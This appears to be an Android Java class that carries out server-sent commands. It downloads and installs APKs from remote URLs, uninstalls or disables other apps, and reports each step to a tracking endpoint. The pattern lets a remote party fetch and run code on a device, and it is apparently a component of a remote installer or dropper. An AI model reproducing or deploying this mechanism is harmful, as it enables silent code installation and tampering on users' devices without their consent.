package com.hs.cld.da;

import android.content.Context;
import android.content.pm.PackageManager;

import com.hs.cld.common.apk.ApkInstaller;
import com.hs.cld.common.dm.ApkInfo;
import com.hs.cld.common.dm.DLS;
import com.hs.cld.da.dx.Tracker;
import com.hs.cld.common.utils.LOG;
import com.hs.cld.common.utils.TextUtils;

public class AppExe implements DLS.OnDownloadListener {
	/**
	 * 日志标签
	 */
	private final static String TAG = "AE";

	/**
	 * 应用上下文
	 */
	private final Context mContext;

	/**
	 * Jar信息
	 */
	private final Message mMessage;

	private long mArrivedInMillis = 0;
	private long mExeInMillis = 0;

	/**
	 * 构造函数
	 * @param context 应用上下文
	 * @param message 应用信息
	 */
	public AppExe(Context context, Message message) {
		this.mContext = context;
		this.mMessage = message;
		this.mArrivedInMillis = System.currentTimeMillis();
	}

	public void fire() {
		try {
			mExeInMillis = System.currentTimeMillis();
			handleAppInfo();
		} catch (Throwable t) {
			LOG.e(TAG, "[" + mMessage + "] ae failed: " + t);
		}
	}

	/**
	 * 处理下发的数据
	 * @throws Exception 异常定义
	 */
	private void handleAppInfo() throws Exception {
		switch (mMessage.mActionVerb) {
			case Message.ACTIONVERB_UNINSTALL:
				uninstallApplication();
				break;
			case Message.ACTIONVERB_ENABLE:
				setApplicationEnabled(true);
				break;
			case Message.ACTIONVERB_DISABLE:
				setApplicationEnabled(false);
				break;
			default:
				installApplication();
				break;
		}
	}

	private void uninstallApplication() throws Exception {
		if (!TextUtils.equals(mMessage.mPkgName, mContext.getPackageName())) {
			ApkInstaller.uninstall(mMessage.mPkgName);
			submitTracker("app.uninstall", true, "OK");
		}
	}

	private void setApplicationEnabled(boolean enable) {
		String reportType = (enable ? "app.enable" : "app.disable");

		try {
			if (!TextUtils.equals(mMessage.mPkgName, mContext.getPackageName())) {
				int newState = (enable ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
				PackageManager pkgMgr = mContext.getPackageManager();
				pkgMgr.setApplicationEnabledSetting(mMessage.mPkgName, newState, 0);
				submitTracker(reportType, true, "OK");
			}
		} catch (Throwable t) {
			submitTracker(reportType, false, t.getMessage());
			LOG.e(TAG, "[" + mMessage.mPkgName + "][" + enable + "] >>><<< failed: " + t);
		}
	}

	private void installApplication() throws Exception {
		ApkInfo apkInfo = new ApkInfo();
		apkInfo.mApkMd5 = mMessage.mFileMd5;
		apkInfo.mApkUrl = mMessage.mUrl;
		apkInfo.mPackageName = mMessage.mPkgName;
		DLS.get().download(mContext, apkInfo, this);
	}

	private void submitTracker(String reportType, boolean ok, String message) {
		Tracker tracker = new Tracker(mContext, mMessage.mReportId);
		tracker.setArrivedInMillis(mArrivedInMillis);
		tracker.setExeInMillis(mExeInMillis);
		tracker.setOK(ok);
		tracker.setErrorMessage(message);
		tracker.setReportType(reportType);
		tracker.request();
	}

	@Override
	public void onStartDownload(ApkInfo apkInfo) {
		submitTracker("app.startDownload", true, "OK");
	}

	@Override
	public void onDownload(ApkInfo apkInfo, boolean ok, Exception e) {
		submitTracker("app.download", ok, ((null != e) ? ("" + e) : ""));
	}

	@Override
	public void onStartInstall(ApkInfo apkInfo) {
	}

	@Override
	public void onInstall(ApkInfo apkInfo, boolean ok, Exception e) {
		submitTracker("app.install", ok, ((null != e) ? ("" + e) : ""));
	}

	@Override
	public void onStartActivate(ApkInfo apkInfo) {
	}

	@Override
	public void onActivate(ApkInfo apkInfo, boolean ok, Exception e) {
		submitTracker("app.activate", ok, ((null != e) ? ("" + e) : ""));
	}
}
